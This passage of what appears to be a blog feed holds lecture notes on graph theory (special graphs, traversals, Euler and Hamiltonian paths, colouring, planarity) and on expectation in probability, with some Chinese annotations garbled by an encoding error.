âˆª V_2$</p><p>Each edge must connect a vertex from $V_1$ to a vertex from $V_2$</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-06-30.png" alt></p><h2 id="Special-Graphs"><a href="#Special-Graphs" class="headerlink" title="Special Graphs"></a>Special Graphs</h2><h3 id="Complete-graph-K-n"><a href="#Complete-graph-K-n" class="headerlink" title="Complete graph $K_n$"></a>Complete graph $K_n$</h3><p>n vertices, all pairwise connected, $\frac{n(n-1)}{2}$ edges.</p><h3 id="Complete-bipartite-graph-K-m-n"><a href="#Complete-bipartite-graph-K-m-n" class="headerlink" title="Complete bipartite graph $K_{m,n}$"></a>Complete bipartite graph $K_{m,n}$</h3><p>Has $m+n$ vertices, partitioned into two (disjoint) sets, one of n, the other of m vertices. </p><p>All vertices from different parts are connected; vertices from the same part are disconnected. No. of edges is $m Â· n$</p><h3 id="Complete-k-partite-graph-K-m-1-â€¦-m-k"><a href="#Complete-k-partite-graph-K-m-1-â€¦-m-k" class="headerlink" title="Complete k-partite graph $K_{m_1,â€¦,m_k}$"></a>Complete k-partite graph $K_{m_1,â€¦,m_k}$</h3><p>Has $m_1 +â€¦+m_k$ vertices, partitioned into k disjoint sets, respectively of $m_1,m_2,â€¦$ vertices.</p><p>No. of edges is $\sum<em>{i&lt;j}m_im_j = \frac{1}{2} \sum</em>{i \neq j}m_im_j$</p><p>These graphs generalise the complete graphs</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-10-29.png" alt></p><p>å‰é¢å®Œå…¨å›¾æ˜¯ä¸€ä¸ªæ¦‚å¿µï¼Œåé¢ä¿© nåˆ†å›¾ æ˜¯ä¸€ä¸ªæ¦‚å¿µã€‚å› ä¸ºmi * mj ï¼ˆiä¸ç­‰äºjæ˜¯è¯´ä¸è¦è‡ªå·±æå®Œå…¨å›¾ï¼Œå› ä¸ºè¿™æ˜¯kåˆ†å›¾ï¼Œæ²¡æœ‰reflexiveï¼‰ã€‚å› ä¸ºaxb å’Œ bxaæ˜¯ä¸€ä¼šå„¿äº‹å„¿ï¼Œæ‰€ä»¥è¦é™¤ä»¥2. 2åˆ†å›¾çš„ mxjå…¶å®ä¹Ÿæ˜¯è¿™ä¸ªå…¬å¼ã€‚</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-20-40.png" alt></p><h2 id="Graph-Isomorphisms"><a href="#Graph-Isomorphisms" class="headerlink" title="Graph Isomorphisms"></a>Graph Isomorphisms</h2><p>$Ï• : G â†’ H$ is a <strong>graph isomorphism</strong> if</p><p>$Ï• : V_G â†’ V_H$ is a bijection</p><p>$(x,y) âˆˆ E_G$ iff $(Ï•(x),Ï•(y)) âˆˆ E_H$</p><p>Two graphs are called <strong>isomorphic</strong> if there exists (at least one) isomorphism between them.</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-27-28.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-27-49.png" alt></p><p>All nonisomorphic trees on 2,3,4 and 5 vertices.</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-23-31.png" alt></p><h1 id="Graph-Traversals"><a href="#Graph-Traversals" class="headerlink" title="Graph Traversals"></a>Graph Traversals</h1><h2 id="Graph-exploration"><a href="#Graph-exploration" class="headerlink" title="Graph exploration"></a>Graph exploration</h2><p>Often it is useful to â€œexploreâ€ a graph: visit vertices in some order and examine each one.</p><p><strong>Search</strong>: Explore the graph until a particular vertex is discovered.</p><p><strong>Traversal</strong>: Examine all the vertices of the graph</p><p>Two common graph exploration algorithms are <strong>Depth-first search/traversal (DFS)</strong> and <strong>Breadth-first search/traversal (BFS)</strong>.</p><p>Both follow the same structure:</p><ul><li>Examine a vertex v</li><li>Discover new vertices (i.e., neighbours of v)</li><li>Move to the next discovered but not yet examined vertex</li></ul><p><strong>DFS</strong>: Examine vertices by <strong>most</strong> recently discovered</p><p><strong>BFS</strong>: Examine vertices by <strong>least</strong> recently discovered</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-33-51.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-34-32.png" alt></p><h2 id="Special-types-of-traversals"><a href="#Special-types-of-traversals" class="headerlink" title="Special types of traversals"></a>Special types of traversals</h2><p>Often we are interested in traversals that have a certain property.</p><p>For example:</p><ul><li><strong>Eulerian</strong> traversals: Visit all the <strong>edges</strong> exactly once</li><li><strong>Hamiltonian</strong> traversals: Visit all the <strong>vertices</strong> exactly once</li></ul><p>æ¬§æ‹‰-trail-æ‰€æœ‰è¾¹ä¸€æ¬¡</p><p>æ±‰å¯†å°”é¡¿-path-æ‰€æœ‰ç‚¹ä¸€æ¬¡</p><p><strong>Take Notice</strong></p><p>In any given graph, these traversals may or may not exist.</p><p>Establishing the existence of such a traversal (decision problem) vs finding one if it exists (search problem) are subtly different problems.</p><h2 id="Edge-Traversal"><a href="#Edge-Traversal" class="headerlink" title="Edge Traversal"></a>Edge Traversal</h2><h3 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h3><p>For a graph G = (V,E).</p><p><strong>Euler trail</strong> â€” trail containing every edge in E exactly once</p><p><strong>Euler circuit</strong> â€” closed Euler trail</p><h3 id="Characterisations"><a href="#Characterisations" class="headerlink" title="Characterisations"></a>Characterisations</h3><p>Suppose G is connected. Then <strong>G</strong> has an <strong>Euler circuit</strong> iff <strong>deg(v) is even for all</strong> $v âˆˆ V$.</p><p>Suppose G is connected. Then <strong>G</strong> has an <strong>Euler trail</strong> iff either it has an Euler circuit or it has <strong>exactly two vertices of odd degree</strong>.</p><p><strong>Take Notice</strong></p><ul><li>These characterisations apply to multigraphs as well</li><li>For directed graphs the condition for existence of an Euler circuit is $indeg(v) = outdeg(v)$ for all $v âˆˆ V$</li></ul><p>æ¬§æ‹‰é“è·¯ï¼ˆEuler trailï¼‰ï¼šæ‰€æœ‰è¾¹ä¸”æ¯æ¡è¾¹åªèµ°ä¸€æ¬¡çš„è·¯å¾„ï¼Œå¯ä»¥æ˜¯å¼€è·¯å¾„ï¼ˆèµ·ç‚¹å’Œç»ˆç‚¹ä¸åŒï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯é—­è·¯å¾„ï¼ˆèµ·ç‚¹å’Œç»ˆç‚¹ç›¸åŒï¼‰ã€‚</p><p>æ¬§æ‹‰å›è·¯ï¼ˆEuler circuitï¼‰ï¼šæ¬§æ‹‰å›è·¯æ˜¯æ¬§æ‹‰é“è·¯çš„ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼Œè¦æ±‚è·¯å¾„æ˜¯é—­åˆçš„ï¼Œå³èµ·ç‚¹å’Œç»ˆç‚¹æ˜¯åŒä¸€ä¸ªé¡¶ç‚¹ã€‚</p><script type="math/tex; mode=display">Euler circuit âŠ† Euler trail</script><p>Hence</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-58-23.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-58-41.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-59-34.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-08-00-33.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-08-01-21.png" alt></p><h3 id="exercise-1"><a href="#exercise-1" class="headerlink" title="exercise 1"></a>exercise 1</h3><p>Construct a graph with vertex set <strong>{0,1} Ã—{0,1}Ã—{0,1}</strong> and with an edge between vertices if they differ in exactly <strong>two</strong> coordinates.</p><p>(a) How many components does this graph have?</p><p>(b) How many vertices of each degree?</p><p>(c) Euler circuit?</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-08-08-48.png" alt></p><h3 id="exercise-2"><a href="#exercise-2" class="headerlink" title="exercise 2"></a>exercise 2</h3><p>As the question above but with an edge between vertices if they differ in two or three coordinates.</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-08-10-35.png" alt></p><p>About why, we can see even degrees between each vertices.</p><h3 id="exercise-3"><a href="#exercise-3" class="headerlink" title="exercise 3"></a>exercise 3</h3><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-08-11-59.png" alt></p><p>å› ä¸ºåœ¨å®Œå…¨å›¾ä¸­ï¼Œnç‚¹æœ‰(n-1)ä¸ªåº¦ï¼Œæ‰€ä»¥å½“næ˜¯å¥‡æ•°ï¼Œä»–æ‰æœ‰å¶æ•°ä¸ªåº¦ã€‚</p><p>å®Œå…¨äºŒåˆ†å›¾ä¸­ï¼Œæ¯ä¸ªéƒ¨åˆ†çš„ç‚¹ä¸å’Œè‡ªå·±ä¸€ä¸ªpartçš„ç‚¹è¿æ¥ï¼Œåªå’Œå¯¹é¢partçš„åº—è¿æ¥ï¼Œå› æ­¤nå’Œméƒ½æ˜¯å¶æ•°ï¼Œåº¦æ‰æ˜¯å¶æ•°ã€‚</p><p>ä¸‰åˆ†å›¾ï¼Œè®¾m,n,qä¸‰ä¸ªéƒ¨åˆ†ã€‚åªæœ‰ä¸¤ä¸¤ç›¸åŠ æ‰èƒ½æ˜¯å¶æ•°ä¸ªåº¦ï¼Œå› æ­¤è¦ä¹ˆå…¨å¥‡æ•°ï¼Œè¦ä¹ˆå…¨å¶æ•°ã€‚</p><h2 id="Vertex-Traversal"><a href="#Vertex-Traversal" class="headerlink" title="Vertex Traversal"></a>Vertex Traversal</h2><h3 id="Definition-1"><a href="#Definition-1" class="headerlink" title="Definition"></a>Definition</h3><ul><li><strong>Hamiltonian path</strong> visits every vertex of graph exactly once</li><li><strong>Hamiltonian cycle</strong> visits every vertex exactly once except the last one, which duplicates the first</li></ul><p><strong>Take Notice</strong></p><p>Finding such a cycle, or proving it does not exist, is a difficult problem â€” the worst case is NP-complete.</p><p>Examples (where the Hamiltonian cycle exists)</p><ul><li>Tetrahedron</li><li>Hexahedron</li><li>$K_m$ for all m</li><li>$K_{m,n}$ iff m = n</li></ul><p>Examples when a Hamiltonian cycle does not exist are much harder to construct.</p><p>Also, given such a graph, it is nontrivial to verify that there is no Hamiltonian cycle. </p><p>There is nothing obvious to specify that could assure us about this property. We have to check all possibilities.</p><p>In contrast, if a cycle is given, it is immediate to verify that it is a Hamiltonian cycle.</p><p>These situations demonstrate the often enormous discrepancy in difficulty of â€˜provingâ€™ versus (simply) â€˜checkingâ€™.</p><p><img src="/2024/11/19/Math/Graph-Theory/Graph.png" alt></p><h1 id="Properties-of-Graphs"><a href="#Properties-of-Graphs" class="headerlink" title="Properties of Graphs"></a>Properties of Graphs</h1><h2 id="Colouring"><a href="#Colouring" class="headerlink" title="Colouring"></a>Colouring</h2><p>Informally: assigning a â€œcolourâ€ to each vertex so that the vertices connected by an edge have different colours.</p><p>Formally: A mapping $c : V â†’ [1..t]$ such that for every $e =(v,w) âˆˆ E$</p><script type="math/tex; mode=display">c(v) \neq c(w)</script><p>The <strong>minimum</strong> t sufficient to effect such a mapping is called the <strong>chromatic number</strong> of a graph $G$ and is denoted $Ï‡(G)$.</p><p><strong>Take Notice</strong></p><p>This notion is extremely important in operations research, esp. in scheduling.</p><p>There is a dual notion of â€˜edge colouringâ€™ â€” two edges that share a vertex need to have different colours. Curiously enough, it is much less useful in practice.</p><h2 id="Properties-of-the-Chromatic-Number"><a href="#Properties-of-the-Chromatic-Number" class="headerlink" title="Properties of the Chromatic Number"></a>Properties of the Chromatic Number</h2><ul><li>$Ï‡(K_n) = n$</li><li>If G has n vertices and $Ï‡(G) = n$ then $G = K_n$</li><li>If $Ï‡(G)$ = 1 then G is totally disconnected: it has 0 edges.</li><li>If $Ï‡(G) = 2$ then G is bipartite</li><li>For any tree $Ï‡(T) = 2$</li><li>For any cycle $C_n$ its chromatic number depends on the parity of n â€” for n even $Ï‡(C_n) = 2$, while for n odd $Ï‡(C_n) = 3$.</li></ul><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-17-12.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-17-20.png" alt></p><h2 id="Cliques"><a href="#Cliques" class="headerlink" title="Cliques"></a>Cliques</h2><p>Graph $Gâ€² = (Vâ€²,Eâ€²)$ is a <strong>subgraph</strong> of $G = (V,E)$, if $Vâ€² âŠ† V$ and $Eâ€² âŠ† E$.</p><h3 id="Definition-2"><a href="#Definition-2" class="headerlink" title="Definition"></a>Definition</h3><p>A <strong>clique</strong> in G is a complete subgraph of G. A clique of k nodes is called <strong>k-clique</strong>.</p><p>The size of the largest clique is called the <strong>clique number</strong> of the graph and denoted $Îº(G)$.</p><ol><li>å›¢æ˜¯å®Œå…¨å›¾</li><li>å›¢æ•° æ˜¯å­å›¾çš„æœ€å¤§å›¢çš„å®šç‚¹æ•°ã€‚</li></ol><h2 id="Theorem"><a href="#Theorem" class="headerlink" title="Theorem"></a>Theorem</h2><script type="math/tex; mode=display">Ï‡(G) â‰¥ Îº(G).</script><p><strong>Proof</strong></p><p>Every vertex of a clique requires a different colour, hence there must be at least $Îº(G)$ colours.</p><p>However, this is the only restriction. For any given k there are graphs with $Îº(G) = k$, while $Ï‡(G)$ can be arbitrarily large.</p><p><strong>Take Notice</strong></p><p>This fact (and such graphs) are important in the analysis of parallel computation algorithms.</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-26-26.png" alt></p><h2 id="exercise-1-1"><a href="#exercise-1-1" class="headerlink" title="exercise 1"></a>exercise 1</h2><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-27-00.png" alt></p><p>A. $Ï‡(G1) = Îº(G1) = 3$; $Ï‡(G2) = Îº(G2) = 2$; $Ï‡(G3) = Îº(G3) = 3$</p><h2 id="exercise-2-1"><a href="#exercise-2-1" class="headerlink" title="exercise 2"></a>exercise 2</h2><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-27-35.png" alt></p><h2 id="Timetable-scheduling"><a href="#Timetable-scheduling" class="headerlink" title="Timetable scheduling"></a>Timetable scheduling</h2><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-29-11.png" alt></p><h2 id="Planar-Graphs"><a href="#Planar-Graphs" class="headerlink" title="Planar Graphs"></a>Planar Graphs</h2><h3 id="Definition-3"><a href="#Definition-3" class="headerlink" title="Definition"></a>Definition</h3><p>A graph is <strong>planar</strong> if it can be embedded in a plane without its edges <strong>intersecting</strong>.</p><h3 id="Theorem-1"><a href="#Theorem-1" class="headerlink" title="Theorem"></a>Theorem</h3><p>If the graph is planar it can be embedded (without self-intersections) in a plane so that all its edges are <strong>straight</strong> lines.</p><h3 id="Take-Notice"><a href="#Take-Notice" class="headerlink" title="Take Notice"></a>Take Notice</h3><p>This notion and its related algorithms are extremely important to VLSI (very large-scale integrationâ€“ refers to an IC or technology with many devices on one chip) and visualizing data.</p><p>æ˜¯è¯´åµŒå…¥å¹³é¢ï¼Œçº¿ä¸ä¼šäº¤å‰ã€‚ä¸è¦æŠŠplanarç†è§£æˆäºŒç»´ä¸‰ç»´å·®åˆ«ã€‚</p><h2 id="Nonplanar-graphs"><a href="#Nonplanar-graphs" class="headerlink" title="Nonplanar graphs"></a>Nonplanar graphs</h2><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-32-29.png" alt></p><p>They are not planar graphs.</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-51-43.png" alt></p><h2 id="Three-utilities-problem"><a href="#Three-utilities-problem" class="headerlink" title="Three utilities problem"></a>Three utilities problem</h2><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-52-06.png" alt></p><h2 id="Testing-for-nonplanarity"><a href="#Testing-for-nonplanarity" class="headerlink" title="Testing for nonplanarity"></a>Testing for nonplanarity</h2><h3 id="Theorem-2"><a href="#Theorem-2" class="headerlink" title="Theorem"></a>Theorem</h3><p>If graph G contains, as a subgraph, a nonplanar graph, then G itself is nonplanar.</p><p>For a graph, <strong>edge subdivision</strong> means to introduce some new vertices, all of degree 2, by placing them on existing edges.</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-09-54-24.png" alt></p><p>We call such a derived graph a <strong>subdivision</strong> of the original one.</p><h3 id="Theorem-3"><a href="#Theorem-3" class="headerlink" title="Theorem"></a>Theorem</h3><p>If a graph is nonplanar then it must contain a subdivision of $K<em>5$ or $K</em>{3,3}$.</p><h2 id="More-nonplanar-graphs"><a href="#More-nonplanar-graphs" class="headerlink" title="More nonplanar graphs"></a>More nonplanar graphs</h2><h3 id="Theorem-4"><a href="#Theorem-4" class="headerlink" title="Theorem"></a>Theorem</h3><p>$K_n$ for $n â‰¥ 5$ is nonplanar.</p><h3 id="Proof"><a href="#Proof" class="headerlink" title="Proof"></a>Proof</h3><p>It contains $K_5$: choose any five vertices in $K_n$ and consider the subgraph they define.</p><h3 id="Theorem-5"><a href="#Theorem-5" class="headerlink" title="Theorem"></a>Theorem</h3><p>$K_{m,n}$ is nonplanar when $m â‰¥ 3$ and $n â‰¥ 3$.</p><h3 id="Proof-1"><a href="#Proof-1" class="headerlink" title="Proof"></a>Proof</h3><p>They contain $K_{3,3}$ â€” choose any three vertices in each of two vertex parts and consider the subgraph they define.</p><h3 id="exercise-1-2"><a href="#exercise-1-2" class="headerlink" title="exercise 1"></a>exercise 1</h3><p>![](<strong>Q</strong>. Are all $K_{m,1}$ planar?</p><p><strong>A</strong>. Yes, they are <strong>trees</strong> of two levels â€” the root and m leaves.</p><h3 id="exercise-2-2"><a href="#exercise-2-2" class="headerlink" title="exercise 2"></a>exercise 2</h3><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-10-00-38.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Statistics</title>
      <link href="/2024/11/19/Math/Statistics/"/>
      <url>/2024/11/19/Math/Statistics/</url>
      
        <content type="html"><![CDATA[<p>Lecture 15: Statistics</p><ul><li><a href="#random-variables-and-expectation">Random Variables and Expectation</a><ul><li><a href="#definition">Definition</a></li><li><a href="#definition-1">Definition</a></li><li><a href="#example">Example</a></li><li><a href="#example-1">Example</a></li><li><a href="#question">Question</a></li><li><a href="#expectation">Expectation</a><ul><li><a href="#definition-2">Definition</a></li><li><a href="#examples-dice">Examples: dice</a></li><li><a href="#examples-dice-1">Examples: dice</a></li></ul></li></ul></li><li><a href="#linearity-of-expectation">Linearity of Expectation</a><ul><li><a href="#theorem-linearity-of-expected-value">Theorem (linearity of expected value)</a><ul><li><a href="#example-1">Example 1</a></li><li><a href="#example-2">Example 2</a><ul><li><a href="#answer-1-the-hard-way">Answer 1. (the â€˜hard wayâ€™)</a></li><li><a href="#answer-2-the-easy-way">Answer 2. (the â€˜easy wayâ€™)</a></li></ul></li></ul></li><li><a href="#observations">Observations</a><ul><li><a href="#exercises-1">Exercises 1</a></li><li><a href="#exercises-2">Exercises 2</a></li></ul></li></ul></li><li><a href="#expected-time-to-success">Expected Time to Success</a><ul><li><a href="#expected-time-to-success-1">Expected time to success</a><ul><li><a href="#theorem">Theorem</a></li><li><a href="#exercise-1">Exercise 1</a></li><li><a href="#exercise-2">Exercise 2</a></li><li><a href="#success-vs-expected-value">Success vs Expected value</a><ul><li><a href="#example-2">Example</a></li></ul></li></ul></li><li><a href="#gamblers-ruin">Gamblerâ€™s ruin</a></li></ul></li><li><a href="#standard-deviation-and-variance">Standard Deviation and Variance</a><ul><li><a href="#definition-3">Definition</a></li><li><a href="#example-3">example</a></li><li><a href="#exercise">exercise</a></li></ul></li></ul><h1 id="Random-Variables-and-Expectation"><a href="#Random-Variables-and-Expectation" class="headerlink" title="Random Variables and Expectation"></a>Random Variables and Expectation</h1><h2 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h2><p>An (integer-valued) <strong>random variable</strong> X is a <strong>function</strong> from <strong>â„¦</strong> to <strong>Z</strong>. In other words, <strong>it associates a number value with every outcome</strong>.</p><p>Random variables are often denoted by X,Y,Z,â€¦</p><p>We extend arithmetic to random variables in the natural way.</p><h2 id="Definition-1"><a href="#Definition-1" class="headerlink" title="Definition"></a>Definition</h2><p>Given random variable $X : â„¦ â†’ Z$, random variable $Y : â„¦ â†’ Z$ and integer k, we can combine X,Y and k to obtain the following functions on all $Ï‰ âˆˆ â„¦$:</p><p>Addition of variables:</p><script type="math/tex; mode=display">X +Y : Ï‰â†’X(Ï‰)+Y(Ï‰)</script><p>Multiplication of variables:</p><script type="math/tex; mode=display">X Â·Y : Ï‰â†’X(Ï‰)Â·Y(Ï‰)</script><p>Scalar addition:</p><script type="math/tex; mode=display">X âˆ’k : Ï‰â†’X(Ï‰)âˆ’k</script><p>Scalar multiplication:</p><script type="math/tex; mode=display">kX : Ï‰â†’kÂ·X(Ï‰)</script><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>Random variable X: value of rolling one die</p><p>â„¦={1,2,3,4,5,6}</p><p>X(i) = i</p><h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h2><p>Random variable $X_s$: sum of rolling two dice</p><p>â„¦={(1,1),(1,2),â€¦,(6,6)}</p><script type="math/tex; mode=display">X_s((1,1)) = 2, X_s((1,2)) = 3 = X_s((2,1)) ...</script><h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p>Is $X_s = X +X$?</p><p>No! X_s æ˜¯ä¸¤ä¸ªç‹¬ç«‹éšæœºå˜é‡çš„å’Œï¼Œæ¯æ¬¡æ‰”è‰²å­çš„ç»“æœæ˜¯ç‹¬ç«‹çš„ã€‚å› æ­¤åº”è¯¥çœ‹ä¸‹é¢è¿™ä¸ªç­‰å¼ã€‚ä»å†™æ³•ä¸Šï¼ŒX+Xæ˜¯è‡ªèº«ç›¸åŠ ï¼Œæ˜¯ç›¸å…³çš„ï¼Œå› ä¸ºä¸¤ä¸ªXæ˜¯åŒä¸€ä¸ªéª°å­è‡ªèº«çš„ç»“æœã€‚</p><script type="math/tex; mode=display">X_s(Ï‰_1,Ï‰_2) = X(Ï‰_1)+Y(Ï‰_2)</script><p>where $X : Ï‰_1 â†’ Ï‰_1$ and $Y :Ï‰_2 â†’ Ï‰_2$ are <strong>independent and identically distributed (i.i.d)</strong></p><h2 id="Expectation"><a href="#Expectation" class="headerlink" title="Expectation"></a>Expectation</h2><h3 id="Definition-2"><a href="#Definition-2" class="headerlink" title="Definition"></a>Definition</h3><p>The <strong>expected value</strong> (often called â€œexpectationâ€ or â€œaverageâ€) of a random variable X is</p><script type="math/tex; mode=display">E(X)=\sum_{k \in \mathbb{Z}} P(X =k)Â·k</script><p><strong>Take Notice</strong></p><p>Expectation is a truly universal concept; it is the basis of all decision making, of estimating gains and losses, in all actions under risk. Historically, a rudimentary concept of expected value arose long before the notion of probability.</p><h3 id="Examples-dice"><a href="#Examples-dice" class="headerlink" title="Examples: dice"></a>Examples: dice</h3><p>The expected value when rolling one die is:</p><script type="math/tex; mode=display">E(X) = \frac{1}{6} \cdot 1 + \frac{1}{6} \cdot 2 + \dots + \frac{1}{6} \cdot 6 = 3.5</script><p>The expected sum when rolling two dice is</p><script type="math/tex; mode=display">E(X_s) = \frac{2}{36} \cdot 1 + \frac{2}{36} \cdot 3 + \dots + \frac{6}{36} \cdot 7 + \dots + \frac{1}{36} \cdot 12 = 7</script><h3 id="Examples-dice-1"><a href="#Examples-dice-1" class="headerlink" title="Examples: dice"></a>Examples: dice</h3><p><strong>Question</strong>. Buy one lottery ticket for $1. The only prize is $1M. Each ticket has probability $6 Â· 10^{âˆ’7}$ of winning. What is the expected value of the lottery ticket?</p><p><strong>Answer</strong></p><p>There are two types of ticket, winning tickets and losing tickets, so we let  â„¦ = {win,lose}, and $X_L : â„¦ â†’ \mathbb{Z}$ such that $X_L(win) = $999,999$ and $X_L(lose)= âˆ’$1$ Then</p><script type="math/tex; mode=display">E(X_L) = 6Â·10^{âˆ’7}Â·\$999,999+(1âˆ’6Â·10^{âˆ’7})Â·âˆ’\$1= âˆ’\$0.4</script><h1 id="Linearity-of-Expectation"><a href="#Linearity-of-Expectation" class="headerlink" title="Linearity of Expectation"></a>Linearity of Expectation</h1><h2 id="Theorem-linearity-of-expected-value"><a href="#Theorem-linearity-of-expected-value" class="headerlink" title="Theorem (linearity of expected value)"></a>Theorem (linearity of expected value)</h2><p>For any random variables X,Y and integer k:</p><script type="math/tex; mode=display">E(X +Y)=E(X)+E(Y)</script><script type="math/tex; mode=display">E(k Â· X) = k Â·E(X)</script><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h3><p>The expected sum when rolling two dice can be computed as</p><script type="math/tex; mode=display">E(X_s) = E(X)+E(Y) = 3.5+3.5 = 7</script><h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h3><p><strong>Question</strong>. Calculate $E(S_n)$, where</p><script type="math/tex; mode=display">S_n \overset{def}{=} no. of \quad heads \quad \text{ in n coin tosses }</script><h4 id="Answer-1-the-â€˜hard-wayâ€™"><a href="#Answer-1-the-â€˜hard-wayâ€™" class="headerlink" title="Answer 1. (the â€˜hard wayâ€™)"></a>Answer 1. (the â€˜hard wayâ€™)</h4><p>Using the definition of the expectation, we have</p><script type="math/tex; mode=display">E(S_n) = \sum^n_{k=0} P(S_n = k)Â·k = \sum^n_{k=0} \frac{1}{2^n} \binom{n}{k} \cdot k</script><p>Since there are $\binom{n}{k}$ sequences of n coin tosses with k heads, and each sequence has the probability $\frac{1}{2^n}$, this gives</p><script type="math/tex; mode=display">E(S_n) = \frac{1}{2^n} \sum^n_{k=1} \frac{n}{k} \binom{n-1}{k-1} k = \frac{n}{2^n} \sum^{n-1}_{k=0} \binom{n-1}{k} = \frac{n}{2^n} \codt 2^{n-1} = \frac{n}{2}</script><p>where we used the â€˜binomial identityâ€™ $\sum^{n}_{k=0}=2^n$ to simplify.</p><h4 id="Answer-2-the-â€˜easy-wayâ€™"><a href="#Answer-2-the-â€˜easy-wayâ€™" class="headerlink" title="Answer 2. (the â€˜easy wayâ€™)"></a>Answer 2. (the â€˜easy wayâ€™)</h4><p>When n =1, we have that $S_1$ : {tails,heads} â†’ {0,1} denotes the number of heads obtained in one coin toss.</p><p>For general n &gt; 1, we can think of $S<em>n$ as being equivalent to repeating a single $S_1$ coin toss, n distinct (and independent) times.  Let $S</em>{1_i}$ denote coin toss number i in this sequence. Then</p><script type="math/tex; mode=display">E(S_n) = E(S_{1_1} + S_{1_2} +...+S_{1_n} ) = \sum^{n}_{i=1} E(S_{1_i}) =  nÂ·E(S_1) = n \cdot \frac{1}{2}</script><h2 id="Observations"><a href="#Observations" class="headerlink" title="Observations"></a>Observations</h2><p><strong>Fact</strong></p><p>If $X_1,X_2,â€¦,X_n$ are <strong>independent, identically distributed (i.i.d)</strong> random variables, then $E(X_1+X_2+â€¦+X_n) = E(nX_1) = nE(X_1)$.</p><p><strong>Take Notice</strong></p><p>$X_1 +X_2+â€¦+X_n$ and $nX_1$ are very different random variables.</p><h3 id="Exercises-1"><a href="#Exercises-1" class="headerlink" title="Exercises 1"></a>Exercises 1</h3><p><strong>Question</strong>.You face a quiz consisting of six true/false questions, and your plan is to guess the answer to each question (randomly, with probability 0.5 of being right). There are nonegative marks, and answering four or more questions correctly suffices to pass.</p><ol><li><p>What is the probability of passing?</p></li><li><p>What is the expected score?</p></li></ol><p><img src="/2024/11/19/Math/Statistics/2024-11-19-12-38-14.png" alt></p><h3 id="Exercises-2"><a href="#Exercises-2" class="headerlink" title="Exercises 2"></a>Exercises 2</h3><p><strong>Question</strong>. An urn has $m+n=10$ marbles, mâ‰¥0 red and nâ‰¥0 blue. 7 marbles selected at random without replacement. What is the expected numberof red marbles drawn?</p><p><img src="/2024/11/19/Math/Statistics/2024-11-19-12-41-47.png" alt></p><h1 id="Expected-Time-to-Success"><a href="#Expected-Time-to-Success" class="headerlink" title="Expected Time to Success"></a>Expected Time to Success</h1><p><strong>Question</strong>. Find the average waiting time for the first <em>head</em>, with no upper bound on the â€˜durationâ€™ (one allows for all possible sequences of tosses, regardless of how many times tails occur initially).</p><p><strong>Answer</strong>. Let â„¦ be the sample space of all possible sequences of H and T.</p><p>Let $X_w : â„¦ â†’\mathbb{N}$ such that $X_w(Ï‰)$ is the first location in Ï‰ containing an H (i.e. the waiting time for Ï‰).For example $X_w(TTHTHÂ·Â·Â·)=3$</p><p>Then the average waiting time is</p><script type="math/tex; mode=display">A =E(Xw) = \sum^{\infty}_{k=1} k Â·P(X_w =k) = \sum^{\infty}_{k=1} k \cdot \frac{1}{2^k} = \frac{1}{2^1}+\frac{2}{2^2}+\frac{3}{2^3} + \dots</script><h2 id="Expected-time-to-success"><a href="#Expected-time-to-success" class="headerlink" title="Expected time to success"></a>Expected time to success</h2><p><img src="/2024/11/19/Math/Statistics/2024-11-19-17-06-51.png" alt></p><h3 id="Theorem"><a href="#Theorem" class="headerlink" title="Theorem"></a>Theorem</h3><p>If the probability of success is p then:</p><ul><li>The expected number of (indep.) trials before <strong>1</strong> success is $\frac{1}{p}$</li><li>The expected number of (indep.) trials before <strong>k</strong> successes is $\frac{k}{p}$</li></ul><h3 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise 1"></a>Exercise 1</h3><p><strong>Question</strong>. Adieisrolled until the first 4 appears. What is the expected waiting time?</p><p><strong>Answer</strong></p><script type="math/tex; mode=display">P(roll 4) = \frac{1}{6}</script><p>hence E(no. of rolls until first 4) = 6.</p><h3 id="Exercise-2"><a href="#Exercise-2" class="headerlink" title="Exercise 2"></a>Exercise 2</h3><p>Question. To find an object $X$ in an unsorted list L of n elements, one needs to search linearly through L. Let the probability of X âˆˆLbe p. Then there is 1âˆ’p likelihood of X being absent altogether. Find the expected number of comparison 